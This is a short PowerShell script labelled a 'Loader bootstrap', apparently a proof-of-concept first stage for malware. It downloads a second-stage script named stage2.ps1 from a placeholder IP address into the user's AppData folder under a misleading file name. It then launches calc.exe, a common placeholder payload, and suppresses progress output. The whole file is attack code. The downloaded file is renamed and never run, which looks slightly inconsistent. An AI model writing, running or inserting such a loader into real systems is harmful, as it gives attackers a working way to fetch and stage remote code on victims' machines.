<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://203.0.113.2/stage2.ps1",
    [string]$LocalPath = "$env:APPDATA\stage1.bin"
)
try { (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $LocalPath); Start-Process -FilePath 'calc.exe'; $ProgressPreference = "SilentlyContinue" } catch { Write-Warning "Loader step failed" }
